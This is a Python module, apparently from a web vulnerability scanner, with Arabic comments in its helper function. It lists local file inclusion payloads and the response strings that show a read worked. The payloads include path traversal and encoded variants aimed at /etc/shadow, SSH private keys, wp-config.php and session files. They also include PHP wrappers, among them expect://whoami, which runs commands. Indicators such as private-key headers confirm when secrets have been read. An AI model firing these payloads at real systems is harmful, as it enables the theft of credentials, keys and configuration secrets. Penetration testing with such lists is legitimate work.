#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
LFI Payloads and Indicators
"""

# LFI Payloads
LFI_PAYLOADS = [
    # Basic LFI payloads
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",
    
    # Linux/Unix files
    "/etc/passwd",
    "/etc/shadow", 
    "/etc/hosts",
    "/etc/group",
    "/etc/issue",
    "/etc/motd",
    "/proc/version",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/mounts",
    "/proc/net/arp",
    
    # Windows files
    "c:\\windows\\win.ini",
    "c:\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    
    # Path traversal variations
    "....//....//....//etc/passwd",
    "..//..//..//..//etc/passwd",
    "..///..///..///etc/passwd",
    "..////..////..////etc/passwd",
    
    # URL encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00",
    
    # Double URL encoded
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    # With null byte
    "../../../../etc/passwd%00.jpg",
    "../../../../etc/passwd%00.html",
    "../../../../etc/passwd%00.txt",
    
    # With PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "expect://whoami",
    
    # Log file inclusion
    "../../../../var/log/auth.log",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/httpd/access_log",
    
    # Configuration files
    "/etc/httpd/conf/httpd.conf",
    "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf",
    "/.htaccess",
    "/web.config",
    
    # SSH files
    "/.ssh/id_rsa",
    "/.ssh/authorized_keys",
    "/.ssh/known_hosts",
    
    # Database configs
    "/var/www/html/config.php",
    "/var/www/html/wp-config.php",
    "/var/www/html/configuration.php",
    
    # Session files
    "/var/lib/php/sessions/sess_[SESSION_ID]",
    "/tmp/sess_[SESSION_ID]",
    
    # Backup files
    "index.php.bak",
    "index.php~",
    "index.php.old",
    ".index.php.swp",
    
    # Web root files
    "/var/www/html/index.php",
    "/var/www/html/admin.php",
    
    # Special files
    "/dev/null",
    "/dev/zero",
    "/dev/random",
]

# LFI Detection Indicators
LFI_INDICATORS = [
    # /etc/passwd content
    "root:x:0:0:",
    "daemon:x:1:1:",
    "bin:x:2:2:",
    "sys:x:3:3:",
    
    # /etc/shadow content
    "root:$",
    "bin:$",
    
    # /etc/hosts content
    "127.0.0.1",
    "localhost",
    
    # /proc/version content
    "Linux version",
    "gcc version",
    
    # PHP errors
    "failed to open stream",
    "No such file or directory",
    "File not found",
    "Warning: include",
    "Warning: require",
    "Warning: fopen",
    
    # Windows files content
    "[fonts]",
    "[extensions]",
    "[files]",
    
    # Configuration files indicators
    "DocumentRoot",
    "ServerRoot",
    "<?php",
    "define('",
    "$db_host",
    "$db_user",
    
    # Log file indicators
    "GET /",
    "POST /",
    "HTTP/1.1",
    
    # SSH key indicators
    "BEGIN RSA PRIVATE KEY",
    "BEGIN OPENSSH PRIVATE KEY",
    "ssh-rsa",
    
    # Base64 encoded content
    "PD9waHA",  # <?php in base64
    
    # Session content
    "PHPSESSID",
    "session_start",
]

# Additional payload categories
LINUX_PAYLOADS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/group",
    "/proc/version",
    "/proc/self/environ",
    "/var/log/auth.log",
]

WINDOWS_PAYLOADS = [
    "c:\\windows\\win.ini",
    "c:\\windows\\system32\\drivers\\etc\\hosts",
    "c:\\boot.ini",
    "..\\..\\..\\..\\windows\\win.ini",
]

PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=etc/passwd",
    "expect://ls",
    "data://text/plain;base64,",
]

def get_payloads_by_category(category="all"):
    """الحصول على payloads حسب التصنيف"""
    categories = {
        "all": LFI_PAYLOADS,
        "linux": LINUX_PAYLOADS,
        "windows": WINDOWS_PAYLOADS,
        "php": PHP_WRAPPERS,
        "basic": LFI_PAYLOADS[:10]  # أول 10 payloads أساسية
    }
    
    return categories.get(category, LFI_PAYLOADS)
